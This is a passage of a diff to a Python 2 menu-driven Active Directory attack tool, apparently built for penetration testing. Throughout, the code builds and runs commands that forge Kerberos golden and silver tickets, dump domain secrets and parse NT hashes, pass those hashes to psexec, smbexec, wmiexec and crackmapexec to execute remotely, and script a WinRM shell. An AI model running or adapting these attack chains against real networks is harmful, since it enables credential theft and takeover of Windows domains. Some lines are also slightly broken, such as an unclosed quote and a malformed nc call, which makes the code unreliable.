          if os.path.exists(POR.rstrip(" ") + ".ccache"):
             command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
          else:
-            command("echo 'TGT was not generated...'")
+            print "TGT was not generated..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1307,7 +1347,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '47':
-      command("echo 'Pass the Ticket has not been implemented yet...'")
+      print "\nPass the Ticket has not been implemented yet..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1321,27 +1362,27 @@ while True:
    if selection == '48':
       print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
       if (FRST[:1] != "") & (WGRP[:1] != ""):
-         os.system(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + USR.rstrip(" "))
-         os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+         command(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + USR.rstrip(" "))
+         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
       else:
-         os.system("echo 'Hash or Domain-SID not found...'")
+         print "Hash or Domain-SID not found..."
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         os.system(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
       else:
-          command("echo 'Golden TGT was not generated...'")
-      
+          print "Golden TGT was not generated..."      
       print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
       HASH = "................................"
       for x in range (0, MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
       if HASH[:1] != ".":
-         os.system(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + POR.rstrip(" "))
-         os.system("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
+         command(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + POR.rstrip(" "))
+         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
       if os.path.exists(POR.rstrip(" ") + ".ccache"):
          command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
       else:
-         command("echo 'Golden TGT was not generated...'")
+         print "Golden TGT was not generated..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1354,27 +1395,27 @@ while True:
    if selection == '49':
       print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
       if (FRST[:1] != "") & (WGRP[:1] != ""):
-         os.system(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + USR.rstrip(" "))
-         os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
+         command(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + USR.rstrip(" "))
+         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
       else:
-         os.system("echo 'Hash or Domain-SID not found...'")
+         command("echo 'Hash or Domain-SID not found...'")
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         os.system(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
       else:
-          command("echo 'Golden TGT was not generated...'")
-      
+          print "Golden TGT was not generated..."
       print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
       HASH = "................................"
       for x in range (0, MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
       if HASH[:1] != ".":
-         os.system(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + POR.rstrip(" "))
-         os.system("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
+         command(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + POR.rstrip(" "))
+         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
       if os.path.exists(POR.rstrip(" ") + ".ccache"):
          command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
       else:
-         command("echo 'Golden TGT was not generated...'")
+         print "Golden TGT was not generated..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1386,8 +1427,7 @@ while True:
 
    if selection =='50':
       print "\n[+] Trying user " + USR.rstrip(" ") + "...\n"
-      os.system(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + HST.rstrip(" "))
-
+      command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + HST.rstrip(" "))
       print "\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n"
       HASH = "................................"
       for x in range (0, MAX):
@@ -1396,7 +1436,8 @@ while True:
       if HASH[:1] != ".":
          command(PRO + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" "))
       else:
-         command("echo 'Hash value was not found...")
+         print "Hash value was not found..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1407,9 +1448,10 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
-      os.system("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+      command("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
       print "\n[+] Checking downloaded files: \n"
       command("ls -la ./" + DIR.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1420,7 +1462,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      command("echo 'Reserved for BLOODHOUND command...'")
+      print "Reserved for BLOODHOUND command..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1432,6 +1475,7 @@ while True:
 
    if selection =='53':
       command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + HST.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1444,15 +1488,14 @@ while True:
    if selection =='54':
       print "\n[+] Please wait...\n"
       os.remove("SECRETS.tmp")
-      os.system(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
+      command(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
       command("cat SECRETS.tmp")
-      os.system("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
+      command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
       os.remove("SECRETS2.tmp")
-      os.system("cat SECRETS.tmp | wc -l > count.txt")
+      command("cat SECRETS.tmp | wc -l > count.txt")
       count = linecache.getline("count.txt", 1)
       count2 = int(count)
       os.remove("count.txt")
-
       for x in range(0, count2):
          data = linecache.getline("SECRETS.tmp",x+1)
          data = data.replace(":::","")
@@ -1461,14 +1504,13 @@ while True:
          get1,get2,get3,get4 = data.split(":")
          get1 = padding(get1,COL3) 			# USER
          get4 = padding(get4,COL4) 			# PASSWORD
-
          for y in range (0, MAX):
             if US[y] == get1:				# MATCH USER
-               PA[y] = get4				# MATCH PASSWORD
- 
+               PA[y] = get4				# MATCH PASSWORD 
       for z in range(0, MAX):
          if US[z].rstrip(" ") == USR.rstrip(" "):	# CURRENT USER
             FRST = PA[z]				# DISPLAY HASH 
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1481,7 +1523,7 @@ while True:
    if selection =='55':
       if (USR[:1] != "\"") & (PAS[:1] != "\""):
          print "\n[-]Trying user " + USR.rstrip(" ") + " with password " + PAS.rstrip(" ") + "...\n"
-         os.system("crackmapexec -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares " + TIP.rstrip(" ")) 
+         command("crackmapexec -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares " + TIP.rstrip(" ")) 
          print "\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n"
          HASH = " "
          for x in range (0, MAX):
@@ -1490,9 +1532,10 @@ while True:
          if HASH[:1] != " ":
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain' --exec-method smbexec")
          else:
-            command("echo 'No hash value was found for user " + POR.rstrip(" ") + "...'")
+            print "No hash value was found for user " + POR.rstrip(" ") + "..."
       else:
-         command("echo 'Username or password not found...'")
+         print "Username or password not found..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1504,7 +1547,7 @@ while True:
 
    if selection =='56':
       print "\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n"
-      os.system(PRO + "psexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      command(PRO + "psexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       print "\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n"
       HASH = "................................"
       for x in range (0,MAX):
@@ -1513,7 +1556,8 @@ while True:
       if HASH[:1] != ".":
          command(PRO + "psexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))     
       else:
-         command("echo 'No hash value was found for user " + POR.rstrip(" ") + "...'")
+         print "No hash value was found for user " + POR.rstrip(" ") + "..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1525,7 +1569,7 @@ while True:
 
    if selection =='57':
       print "\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n"
-      os.system(PRO + "smbexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      command(PRO + "smbexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       print "\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n"
       HASH = "................................"
       for x in range (0,MAX):
@@ -1534,7 +1578,8 @@ while True:
       if HASH[:1] != ".":
          command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))
       else:
-         command("echo 'No hash value was found for user " + POR.rstrip(" ") + "...'")
+         print "No hash value was found for user " + POR.rstrip(" ") + "..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1546,7 +1591,7 @@ while True:
 
    if selection =='58':
       print "\n[-]Trying user " + USR.rstrip(" ") + " with NTLM HASH " + FRST.rstrip("\n") + "...\n"
-      os.system(PRO + "wmiexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
+      command(PRO + "wmiexec.py -hashes :" + FRST.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       print "\n[-]Trying user " + POR.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH...\n"
       HASH = "................................"
       for x in range (0,MAX):
@@ -1555,7 +1600,8 @@ while True:
       if HASH[:1] != ".":
          command(PRO + "smbexec.py -hashes :" + HASH + " " + POR.rstrip(" ") + "@" + TIP.rstrip(" "))   
       else:
-         command("echo 'No hash value was found for user " + POR.rstrip(" ") + "...'")
+         print "No hash value was found for user " + POR.rstrip(" ") + "..."
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1566,15 +1612,16 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='59':
-      os.system('echo "require \'winrm\' " > winshell.rb')
-      os.system('echo "" >> winshell.rb')
-      os.system('echo "conn = WinRM::Connection.new(" >> winshell.rb')
-      os.system('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
-      os.system('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
-      os.system('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
-      os.system('echo ")" >> winshell.rb')
-      os.system("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
-      command("ruby winshell.rb")         
+      command('echo "require \'winrm\' " > winshell.rb')
+      command('echo "" >> winshell.rb')
+      command('echo "conn = WinRM::Connection.new(" >> winshell.rb')
+      command('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
+      command('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
+      command('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
+      command('echo ")" >> winshell.rb')
+      command("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
+      command("ruby winshell.rb")
+      prompt()         
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1586,6 +1633,7 @@ while True:
 
    if selection =='60':
       command("pftp " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1597,6 +1645,7 @@ while True:
 
    if selection =='61':
       command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1608,6 +1657,7 @@ while True:
 
    if selection =='62':
       command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1619,6 +1669,7 @@ while True:
 
    if selection =='63':
       command("nc -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
